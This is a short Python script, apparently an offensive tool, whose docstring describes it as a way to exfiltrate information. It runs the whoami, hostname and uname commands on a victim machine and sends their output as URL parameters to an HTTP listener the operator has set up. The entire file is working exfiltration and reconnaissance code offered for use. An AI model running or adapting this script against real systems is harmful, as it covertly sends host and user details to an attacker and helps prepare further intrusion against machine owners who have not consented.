#!/usr/bin/env python
'''
After setting up the server on the network with:
    python -m http.server
exfiltrate info from commands with:
    python http_exfiltrate.py
'''
import requests
from urllib.parse import urlencode
import subprocess
from subprocess import PIPE, STDOUT

commands = ['whoami','hostname','uname']
out = {}
for command in commands:
    try:
        p = subprocess.Popen(command, stderr=STDOUT, stdout=PIPE)
        out[command] = p.stdout.read().strip()
    except:
        pass
requests.get('http://localhost:8000/index.html?' + urlencode(out))
